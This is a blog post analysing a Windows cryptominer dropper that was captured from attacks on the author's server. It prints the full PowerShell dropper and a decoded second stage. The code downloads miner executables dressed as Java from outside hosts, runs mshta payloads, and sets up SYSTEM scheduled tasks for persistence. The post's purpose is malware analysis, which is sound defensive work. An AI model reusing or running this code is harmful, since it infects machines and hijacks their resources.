---
title: "Disinvited by User Agent Retry - Windows"
#author: "Author Name"
description: "The capture of that which eluded me previously"
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-06-28T00:00:00-00:00
draft: false
---

Finally, a chance to grab the Windows binaries that eluded me in my previous attempts during Disinvited By User Agent.  I had the same attack probing my server this morning attempting to download and execute a Windows script, but this time I determined the correct user agent for the .Net WebClient class - it's blank.  The class, by default, doesn't send any headers...

curl -A "" hxxp://107.181.174.232/win/checking.ps1 -o checking.ps1

```powershell
$W = New-Object System.Net.WebClient
$arch = Get-WmiObject Win32_Processor | Select-Object -Exp AddressWidth
$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
$osver =  ([environment]::OSVersion.Version).Major


Function win10() {
        mkdir C:\ProgramData\Oracle
        mkdir C:\ProgramData\Oracle\Java
	$W.DownloadFile("hxxp://107.181.174.232/win/bat/win10.bat","C:\Windows\Fonts\sasd.bat")
        cmd /c SCHTASKS /create /tn \Microsoft\Windows\MobilePC\DetectPC /sc MINUTE /f  /mo 10 /tr "cmd /c C:\Windows\Fonts\sasd.bat"  /ru "NT AUTHORITY\SYSTEM" 	
        cmd /c schtasks /tn \Microsoft\Windows\MobilePC\DetectPC /run
        cmd /c SCHTASKS /create /tn \Microsoft\Windows\Shell\WindowsShellUpdate /sc HOURLY /f  /mo 6 /tr "cmd /c mshta hxxp://107.181.174.232/win/update.hta"  /ru "NT AUTHORITY\SYSTEM"   /RL HIGHEST
        cmd /c SCHTASKS /create /tn \Microsoft\Windows\Shell\WinShell /sc DAILY /f  /mo 1 /tr "cmd /c mshta hxxp://107.181.174.232/win/checking.hta"  /ru SYSTEM   /RL HIGHEST
        cmd /c SCHTASKS /create /tn \Microsoft\Windows\UPnP\UPnPHost /sc DAILY /f  /mo 2 /tr "cmd /c mshta hxxp://52irwh2dmhkuhbv5.onion.to/win/checking.hta"  /ru SYSTEM   /RL HIGHEST
        cmd /c SCHTASKS /create /tn \Microsoft\Windows\Registry\RegBackup /sc MINUTE /f  /mo 5 /tr "cmd /c schtasks /tn \Microsoft\Windows\Bluetooth\UpdateDeviceTask /run"  /ru "NT AUTHORITY\SYSTEM"   /RL HIGHEST
	break
	kill $pid
}


Function PrivTrue() {
	mkdir C:\ProgramData\Oracle
	mkdir C:\ProgramData\Oracle\Java
	IF ($arch -eq "64")
	{
	        $W.DownloadFile("hxxp://107.181.174.232/win/min/64.exe","C:\ProgramData\Oracle\Java\java.exe")
	}
	        ELSE
	{
		$W.DownloadFile("hxxp://107.181.174.232/win/min/32.exe","C:\ProgramData\Oracle\Java\java.exe")
	}
	cmd /c schtasks  /create /TN \Microsoft\Windows\Bluetooth\UpdateDeviceTask /TR "C:\ProgramData\Oracle\Java\java.exe" /ST 00:00 /SC once /DU 599940 /RI 1 /F /RL HIGHEST /RU SYSTEM
	cmd /c SCHTASKS /create /tn \Microsoft\Windows\Shell\WindowsShellUpdate /sc HOURLY /f  /mo 6 /tr "cmd /c mshta hxxp://107.181.174.232/win/update.hta"  /ru "NT AUTHORITY\SYSTEM"   /RL HIGHEST	
	cmd /c SCHTASKS /create /tn \Microsoft\Windows\Shell\WinShell /sc DAILY /f  /mo 1 /tr "cmd /c mshta hxxp://107.181.174.232/win/checking.hta"  /ru SYSTEM   /RL HIGHEST
	cmd /c SCHTASKS /create /tn \Microsoft\Windows\UPnP\UPnPHost /sc DAILY /f  /mo 2 /tr "cmd /c mshta hxxp://52irwh2dmhkuhbv5.onion.to/win/checking.hta"  /ru SYSTEM   /RL HIGHEST
	cmd /c SCHTASKS /create /tn "\Microsoft\Windows\EDP\EDP App Lock Task"  /sc hourly /f  /mo 22 /tr "cmd /c mshta hxxp://asq.r77vh0.pw/win/checking.hta"  /ru SYSTEM
	cmd /c SCHTASKS /create /tn \Microsoft\Windows\Registry\RegBackup /sc MINUTE /f  /mo 5 /tr "cmd /c schtasks /tn \Microsoft\Windows\Bluetooth\UpdateDeviceTask /run"  /ru "NT AUTHORITY\SYSTEM"   /RL HIGHEST 
	cmd /c schtasks /tn  \Microsoft\Windows\Bluetooth\UpdateDeviceTask /run
	$W.DownloadFile("hxxp://107.181.174.232/win/sasd.bat","C:\Windows\Fonts\sasd.bat")
	cmd /c SCHTASKS /create /tn \Microsoft\Windows\MobilePC\DetectPC /sc MINUTE /f  /mo 10 /tr "cmd /c C:\Windows\Fonts\sasd.bat"  /ru "NT AUTHORITY\SYSTEM"   
	
}

Function PrivFalse() {
	W.DownloadFile("hxxp://107.181.174.232/win/privfalse.bat","$env:APPDATA\Microsoft\Network\PrivFalse.bat")
	cmd /c SCHTASKS /create /tn "Optimize Start Menu Cache Files-S-3-5-21-2236678155-433519125-1142214968-1037" /sc MINUTE /f  /mo 5 /tr "cmd /c %appdata%\Microsoft\Network\PrivFalse.bat"
	cmd /c SCHTASKS /create /tn "Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1037" /sc HOURLY /f  /mo 22 /tr "cmd /c mshta hxxp://107.181.174.232/win/checking.hta"
	cmd /c SCHTASKS /create /tn "Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1137" /sc HOURLY /f  /mo 20 /tr "cmd /c mshta hxxp://asq.r77vh0.pw/win/checking.hta"
}

Function CleanerEtc() {
	$W.DownloadFile("hxxp://107.181.174.232/win/del.ps1","C:\Windows\Fonts\del.ps1")
	C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "cmd /c powershell -exec bypass C:\Windows\Fonts\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create
}

Function PrivFalsemStop() {
	cmd /c schtasks /tn "Optimize Start Menu Cache Files-S-3-5-21-2236678155-433519125-1142214968-1037" /delefe /f
	cmd /c wmic process where executablepath="C:\\ProgramData\\Oracle\\Java\\java.exe" delete 
        start-sleep 1
	cmd /c del /q /f "C:\ProgramData\Oracle\Java\java.exe"
}

Function PrivTrueMStop() {
	cmd /c schtasks /tn \Microsoft\Windows\Registry\RegBackup /delete /f
	cmd /c schtasks /tn \Microsoft\Windows\Bluetooth\UpdateDeviceTask /end
	cmd /c wmic process where executablepath="C:\\ProgramData\\Oracle\\Java\\java.exe" delete 
	start-sleep 1
	cmd /c del /q /f C:\ProgramData\Oracle\Java\java.exe
}


IF ($osver -eq "10")
{
	echo "win10"
	win10
}

IF ($priv -eq $true)
{
	PrivTrueMStop
	start-sleep 5
	PrivTrue
}
else
{
	PrivFalsemStop
	PrivFalse
}
CleanerEtc
#cmd /c powershell  -w 1 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('hxxp://107.181.174.232/win/sc.ps1'))
cmd /c taskkill /im mshta.exe /f
```

Finally, awesome.  And a whole bunch of other great stuff to download too, including a bunch of stuff VirusTotal hasn't seen yet.

The main tactic used in here is setting up persistence using scheduled tasks - an oldie but a goodie.

Lots of use of [mshta](https://attack.mitre.org/wiki/Technique/T1170) too...  Pretty cool.  This allows execution of VBScript, which re-downloads and executes the checking.ps1.

Dropping a fake Java...  Nice.  Makes it look like the executable isn't unfriendly...  But at least the 32-bit version is UPX packed.

privfalse.bat contains some powershell which looks like it does some text replacement, maybe base64 decoding, then executes the result.  Here's the un-base64 encoded version...

```powershell
$arch = Get-WmiObject Win32_Processor | Select-Object -Exp AddressWidth
$WebClient = New-Object System.Net.WebClient
mkdir C:\ProgramData\Oracle\Java > $null
if((Test-Path $env:Temp\waqs.txt) -eq $true)
{
	echo "Pass"
} else {
echo "98098" > $env:Temp\waqs.txt
}
$pidm = Get-Content $env:Temp\waqs.txt 


if((Test-Path C:\ProgramData\Oracle\Java\java.exe) -eq $true)
{
    echo "pass miner"
} 
else {
	
		IF ($arch -eq "64")
		{
			$WebClient.DownloadFile("hxxp://107.181.174.232/win/min/64.exe","C:\ProgramData\Oracle\Java\java.exe")
		}
				ELSE
		{
			$WebClient.DownloadFile("hxxp://107.181.174.232/win/min/64.exe","C:\ProgramData\Oracle\Java\java.exe")
		}
}

if((get-process -id $pidm -ErrorAction SilentlyContinue) -eq $Null){ 
			(invoke-wmimethod win32_process -name create -argumentlist 'C:\\ProgramData\\Oracle\\Java\\java.exe').ProcessId > $env:Temp\waqs.txt
	}

	else{ 
		echo $null
}
```


